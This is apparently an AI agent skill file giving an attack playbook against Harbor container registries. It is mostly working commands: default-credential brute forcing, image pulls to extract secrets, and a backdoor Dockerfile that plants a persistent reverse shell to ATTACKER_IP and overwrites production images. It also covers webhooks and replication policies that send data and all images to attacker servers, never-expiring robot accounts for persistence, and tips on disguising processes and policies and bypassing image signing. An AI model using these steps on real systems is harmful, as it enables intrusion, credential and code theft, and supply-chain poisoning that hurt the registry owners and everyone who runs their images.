---
name: harbor-tactics
description: "Harbor container image registry attacks. Use when a Harbor instance is discovered, the default credentials admin/Harbor12345 are unchanged, the Harbor API is exposed, or you need to steal images from Harbor or inject backdoors. Covers unauthorized access and public repository enumeration, default credential attacks, image backdoor injection (supply chain attacks), webhook abuse, replication policy exploitation (cross-registry data theft), and image scanning bypass"
zh-signals: "攻击 Harbor 容器镜像仓库，涵盖默认凭据、未授权访问、镜像后门注入、Webhook 与复制策略滥用。信号:Harbor攻击,镜像仓库,默认凭据,供应链攻击,镜像后门"
when-to-use: "Use when a Harbor registry is discovered and you need to test default credentials, unauthorized access, image backdoors, or replication abuse."
metadata:
  tags: "harbor,container-registry,docker-registry,admin,Harbor12345,webhook,replication,supply-chain-attack,image-backdoor"
  category: "postexploit"
---

# Harbor Container Image Registry Penetration Testing and Exploitation Methodology

Harbor is an enterprise-grade private container image registry offering image hosting, vulnerability scanning, signature verification, replication policies, Robot Accounts, and more. The default administrator account `admin/Harbor12345` remains unchanged in a large number of deployments. Once administrator access is obtained, an attacker can enumerate and pull images from all projects, extract hardcoded credentials from image layers (environment variables/config files/private keys), inject backdoored images to conduct supply chain attacks, create webhooks for event monitoring and data exfiltration, abuse replication policies to steal images to an attacker-controlled registry, and create Robot Accounts for persistent access.

## Further Reading

Once you have identified the specific attack path, load the reference document for the complete commands and exploitation payloads:

- API calls, image analysis, injection templates, webhook/replication policy configuration → read [references/attack-techniques.md](references/attack-techniques.md)

## Phase 1: Service Discovery and Version Identification

### 1.1 Instance Identification

Harbor default ports and fingerprints:

| Component | Default Port | Identifying Features |
|---|---|---|
| Web UI / API | 80 / 443 | `/api/v2.0/systeminfo` returns a version, `/harbor/sign-in` login page |
| Docker Registry API | 443 / 5000 | `/v2/` returns `{}` or 401, `Docker-Distribution-API-Version` response header |
| Notary (image signing) | 4443 | TLS, Notary Server API |
| Trivy (vulnerability scanning) | Internal | Invoked indirectly through the Harbor API |

```bash
# Fingerprint probing
curl -sk https://TARGET/api/v2.0/systeminfo | jq .
# Example response: {"with_notary":true,"with_trivy":true,"harbor_version":"v2.x.x",...}

# Docker Registry API probing
curl -sk https://TARGET/v2/
# Returns {} or 401 Unauthorized (confirms it is a Docker Registry)

# Landing page probing
curl -sk -o /dev/null -w "%{http_code}" https://TARGET/harbor/sign-in
# 200 = Harbor Web UI
```

### 1.2 Version and Feature Detection

The version determines the available attack surface:

| Version Range | Key Features | Security Impact |
|---|---|---|
| v1.x | Legacy API (`/api/`), ChartMuseum | Some APIs require no authentication |
| v2.0-v2.4 | New API (`/api/v2.0/`), Robot Account v1 | Coarse-grained Robot Account permissions |
| v2.5+ | Robot Account v2, Cosign signing | Fine-grained permissions but complex configuration |
| v2.8+ | OIDC group mapping, Proxy Cache | Proxy Cache may leak upstream credentials |

## Phase 2: Authentication Detection and Credential Acquisition

### 2.1 Default Credential Testing

```bash
# Default administrator credentials (unchanged in many deployments)
curl -sk -u admin:Harbor12345 https://TARGET/api/v2.0/users/current | jq .

# Common weak passwords
for pass in Harbor12345 harbor admin Admin123 password; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
    -u "admin:$pass" https://TARGET/api/v2.0/users/current)
  echo "admin:$pass -> $CODE"
done
```

### 2.2 API Token and Docker Login

```bash
# Docker CLI login (on success the credentials are cached in ~/.docker/config.json)
docker login TARGET -u admin -p Harbor12345

# Obtain a Bearer Token (for the Registry API)
curl -sk "https://TARGET/service/token?service=harbor-registry&scope=registry:catalog:*" \
  -u admin:Harbor12345 | jq -r '.token'

# Call the API directly with Basic Auth
HARBOR_AUTH=$(echo -n 'admin:Harbor12345' | base64)
curl -sk -H "Authorization: Basic $HARBOR_AUTH" https://TARGET/api/v2.0/projects
```

### 2.3 LDAP/OIDC Authentication Bypass

Harbor supports LDAP/OIDC external authentication. If anonymous LDAP binding is enabled or OIDC is misconfigured, authentication may be bypassed:

```bash
# Check the authentication mode
curl -sk https://TARGET/api/v2.0/systeminfo | jq '.auth_mode'
# "db_auth" = local database, "ldap_auth" = LDAP, "oidc_auth" = OIDC

# In LDAP authentication mode, attempt LDAP injection
# username: *)(objectClass=* or admin)(&
```

## Phase 3: Attack Decision Tree

```
Harbor instance discovered
├── Unauthenticated
│   ├── /api/v2.0/systeminfo → confirm the version and features
│   ├── /api/v2.0/projects → enumerate public projects (project_public=true)
│   ├── /v2/_catalog → Registry API image catalog (may require no authentication)
│   ├── Default credentials admin/Harbor12345 → attempt login
│   └── Unable to log in → search for leaked ~/.docker/config.json / Harbor Token
│
├── Authenticated (administrator privileges)
│   ├── Project and image enumeration → Phase 4
│   │   ├── All project list → private project exposure
│   │   ├── Image list → pull and analyze (credential extraction)
│   │   └── Artifact tags → identify production/sensitive images
│   │
│   ├── Image pull and credential extraction → Phase 5
│   │   ├── docker pull → analyze image layers locally
│   │   ├── Environment variables → API keys/database passwords
│   │   ├── Config files → .env / config.yaml / application.properties
│   │   └── Private keys/certificates → SSH keys / TLS certificates
│   │
│   ├── Do you have push permissions?
│   │   └── Yes → image backdoor injection (supply chain attack) → Phase 6
│   │
│   ├── Administrator features
│   │   ├── Webhook creation → event monitoring/data exfiltration → Phase 7
│   │   ├── Replication policy → steal images to an attacker registry → Phase 8
│   │   ├── Robot Account → persistent access → Phase 9
│   │   └── Vulnerability scan reports → known vulnerability intelligence → Phase 10
│   │
│   └── User management → create backdoor accounts / privilege escalation
│
└── Authenticated (regular user)
    ├── Enumerate visible projects → pull and analyze images
    ├── Project member list → identify high-privilege users
    └── Attempt privilege escalation → project admin → system admin
```

## Phase 4: Project and Image Enumeration

### 4.1 Project Enumeration

```bash
# List all projects (requires authentication, or returns only public projects)
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/projects?page_size=100" | jq '.[].name'

# Project details (member count, image count, storage quota)
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/projects?page_size=100" | \
  jq '.[] | {name, repo_count, metadata}'
```

### 4.2 Repository Enumeration

```bash
# All repositories of a given project
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/projects/PROJECT_NAME/repositories?page_size=100" | \
  jq '.[].name'

# Artifact (tag) list
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/projects/PROJECT_NAME/repositories/REPO_NAME/artifacts" | \
  jq '.[] | {digest: .digest, tags: [.tags[]?.name], size: .size}'
```

→ read [references/attack-techniques.md](references/attack-techniques.md) for the batch enumeration script

## Phase 5: Image Pulling and Credential Extraction

Images are the highest-value attack targets — developers frequently hardcode credentials, API keys, and database connection strings inside images.

### 5.1 Image Pulling

```bash
# Pull with the Docker CLI
docker pull TARGET/PROJECT_NAME/IMAGE:TAG

# Pull with skopeo (no Docker daemon required)
skopeo copy --src-tls-verify=false \
  docker://TARGET/PROJECT_NAME/IMAGE:TAG \
  dir:./image-export/

# Pull with crane
crane pull --insecure TARGET/PROJECT_NAME/IMAGE:TAG image.tar
```

### 5.2 Image Analysis and Credential Extraction

```bash
# View the image history (exposes ENV/ARG/COPY operations from the build)
docker history TARGET/PROJECT_NAME/IMAGE:TAG --no-trunc

# Analyze layer by layer with dive
dive TARGET/PROJECT_NAME/IMAGE:TAG

# Export the image filesystem
docker save TARGET/PROJECT_NAME/IMAGE:TAG -o image.tar
mkdir image-layers && tar xf image.tar -C image-layers/
```

High-value search targets:

| File/Path | Possible Credentials |
|---|---|
| `/app/.env` / `/.env` | Database passwords, API keys, secrets |
| `/app/config.*` / `/etc/app/` | Application configuration (connection strings) |
| `~/.ssh/id_rsa` | SSH private keys |
| `~/.aws/credentials` | AWS AK/SK |
| `/run/secrets/*` | Docker Secrets |
| `ENV` instruction | Credentials in environment variables |

→ read [references/attack-techniques.md](references/attack-techniques.md) for the automated credential search script

## Phase 6: Image Backdoor Injection (Supply Chain Attack)

If you have push permissions, you can tamper with an image to implant a backdoor:

### 6.1 Attack Flow

```
Pull the target image → add a malicious layer → re-tag → push to overwrite the original image
```

```bash
# Pull the original image
docker pull TARGET/PROJECT/IMAGE:latest

# Create the backdoor Dockerfile
cat > Dockerfile.inject <<'DEOF'
FROM TARGET/PROJECT/IMAGE:latest
# Inject a reverse shell into the startup script
RUN echo '#!/bin/sh' > /tmp/.init && \
    echo 'nohup sh -c "while true; do sh -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1; sleep 60; done" &' >> /tmp/.init && \
    chmod +x /tmp/.init
# Modify the entrypoint to run the backdoor first
COPY --from=0 / /
ENTRYPOINT ["/bin/sh", "-c", "/tmp/.init; exec $0 $@"]
DEOF

# Build and push (overwriting the original tag)
docker build -f Dockerfile.inject -t TARGET/PROJECT/IMAGE:latest .
docker push TARGET/PROJECT/IMAGE:latest
```

### 6.2 Stealth Injection Techniques

- Use a multi-stage build to reduce the size difference of the extra layer
- Disguise the backdoor process name as a legitimate process (e.g. `[kworker/0:1]`)
- Reuse an existing base image layer to avoid adding suspicious layers
- Keep the original ENTRYPOINT/CMD unchanged and inject via `LD_PRELOAD` or an init script

→ read [references/attack-techniques.md](references/attack-techniques.md) for the complete backdoor Dockerfile templates

## Phase 7: Webhook Abuse

Harbor webhooks can notify external services on events such as image push/pull/delete — an attacker can abuse this mechanism to monitor repository activity or exfiltrate data.

### 7.1 Webhook Enumeration and Creation

```bash
# List the webhooks of a project
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/projects/PROJECT_ID/webhook/policies" | jq .

# Create a malicious webhook (listen to all events)
curl -sk -X POST -u admin:Harbor12345 \
  -H "Content-Type: application/json" \
  "https://TARGET/api/v2.0/projects/PROJECT_ID/webhook/policies" \
  -d '{
    "name": "audit-integration",
    "targets": [{
      "type": "http",
      "address": "https://ATTACKER_SERVER/harbor-hook",
      "skip_cert_verify": true
    }],
    "event_types": [
      "PUSH_ARTIFACT", "PULL_ARTIFACT", "DELETE_ARTIFACT",
      "SCANNING_COMPLETED", "TAG_RETENTION"
    ],
    "enabled": true
  }'
```

Webhook notifications contain the project name, repository name, image tag, and the operator username — usable to:
- Monitor which images are pulled frequently (identify production images)
- Monitor newly pushed images (steal the latest build artifacts)
- Collect operator usernames (for follow-up credential attacks)

## Phase 8: Replication Policy Exploitation

Harbor replication policies automatically sync images to a remote registry — an attacker can create a replication policy to steal all images to a registry they control.

### 8.1 Enumerate Existing Replication Policies

```bash
# List replication policies
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/replication/policies" | jq .

# List remote registry endpoints
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/registries" | jq '.[] | {id, name, url, credential}'
```

### 8.2 Create a Theft Policy

```bash
# First register the attacker registry endpoint
curl -sk -X POST -u admin:Harbor12345 \
  -H "Content-Type: application/json" \
  "https://TARGET/api/v2.0/registries" \
  -d '{
    "name": "backup-registry",
    "url": "https://ATTACKER_REGISTRY",
    "credential": {"type": "basic", "access_key": "USER", "access_secret": "PASS"},
    "insecure": true,
    "type": "docker-hub"
  }'

# Create the replication policy (push mode, all images)
curl -sk -X POST -u admin:Harbor12345 \
  -H "Content-Type: application/json" \
  "https://TARGET/api/v2.0/replication/policies" \
  -d '{
    "name": "disaster-recovery-sync",
    "src_registry": null,
    "dest_registry": {"id": REGISTRY_ID},
    "trigger": {"type": "manual"},
    "filters": [],
    "enabled": true,
    "override": true
  }'
```

→ read [references/attack-techniques.md](references/attack-techniques.md) for automatic trigger and incremental theft configuration

## Phase 9: Robot Account Persistence

Robot Accounts are Harbor's service account mechanism — an attacker can create a Robot Account for persistent access that requires no user password.

### 9.1 Robot Account Management

```bash
# List system-level Robot Accounts
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/robots" | jq '.[] | {id, name, level, expires_at}'

# List project-level Robot Accounts
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/projects/PROJECT_NAME/robots" | jq .

# Create a system-level Robot Account (pull/push on all projects)
curl -sk -X POST -u admin:Harbor12345 \
  -H "Content-Type: application/json" \
  "https://TARGET/api/v2.0/robots" \
  -d '{
    "name": "ci-scanner",
    "duration": -1,
    "level": "system",
    "permissions": [{
      "kind": "project",
      "namespace": "*",
      "access": [
        {"resource": "repository", "action": "pull"},
        {"resource": "repository", "action": "push"}
      ]
    }]
  }'
# The secret in the response is shown only once — be sure to save it
```

## Phase 10: Vulnerability Scan Report Theft

Harbor has Trivy vulnerability scanning built in — the scan reports can be used to identify images in the target environment that carry known vulnerabilities.

```bash
# Obtain the vulnerability report of an artifact
curl -sk -u admin:Harbor12345 \
  -H "X-Accept-Vulnerabilities: application/vnd.security.vulnerability.report; version=1.1" \
  "https://TARGET/api/v2.0/projects/PROJECT/repositories/REPO/artifacts/TAG/additions/vulnerabilities" | \
  jq '.. | .vulnerabilities? // empty | .[] | {id, severity, package, version, fix_version}'

# Filter Critical/High vulnerabilities (usable for follow-up exploitation)
# Focus on: CVE numbers, affected package names, fix versions
```

Vulnerability report value:
- Identify known CVEs in running images → exploit directly
- Understand the target's patching discipline (how long unpatched → security management maturity)
- Locate base images containing specific vulnerabilities (e.g. Log4j → every service using that base image is affected)

## Tool Quick Reference

| Tool | Purpose | Key Commands |
|---|---|---|
| `curl` + Harbor API | REST API calls | `/api/v2.0/projects`, `/api/v2.0/robots` |
| `docker` CLI | Image pull/push/analysis | `docker pull/push/history/save` |
| `skopeo` | Daemonless image operations | `skopeo copy/inspect/list-tags` |
| `crane` | Lightweight registry tooling | `crane pull/push/ls/digest` |
| `dive` | Image layer analysis | `dive IMAGE` to inspect file changes layer by layer |
| `trivy` | Local vulnerability scanning | `trivy image IMAGE` |
| `jq` | JSON parsing | Parse API responses |

## Notes

- **Audit logs**: Harbor records all API calls, image pull/push operations, and user logins; administrators can view all audit events on the "Logs" page
- **Default credentials**: `admin/Harbor12345` is the default password set at install time and is unchanged in many production environments; once changed, the original password cannot be recovered
- **Image signing**: if Cosign/Notary signature verification is enabled, tampered images may be rejected at deployment — you must forge the signature or disable the verification policy at the same time
- **Quota limits**: Harbor supports project-level storage quotas, and heavy pull/push activity may trigger quota alerts
- **Replication policies**: created replication policies and registry endpoints are visible to all administrators — name them to look like legitimate disaster recovery/sync policies
- **Robot Accounts**: system-level Robot Accounts are visible to all administrators, project-level ones only to project administrators — prefer project-level for persistence
- **Proxy Cache**: Proxy Cache projects in v2.8+ may cache authentication credentials of upstream registries — worth checking
- **Garbage Collection**: Harbor GC cleans up layers not referenced by any tag — an overwritten original image may be permanently lost after GC
